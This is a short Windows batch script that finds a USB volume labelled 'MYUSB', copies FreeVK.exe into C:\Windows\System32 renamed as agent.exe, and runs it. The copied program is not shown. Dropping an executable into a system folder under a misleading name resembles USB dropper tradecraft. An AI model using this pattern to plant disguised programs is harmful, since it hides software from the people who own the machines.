@echo of

:BEGIN
cls
@echo.
@echo copy file to HDD and excute it
@echo.
pause
for /f %%d in ('wmic volume get driveletter^, label ^| findstr "MYUSB"') do set myd=%%d
copy %myd%\FreeVK.exe  C:\Windows\System32\agent.exe
cd C:\Windows\System32\
START agent.exe
pause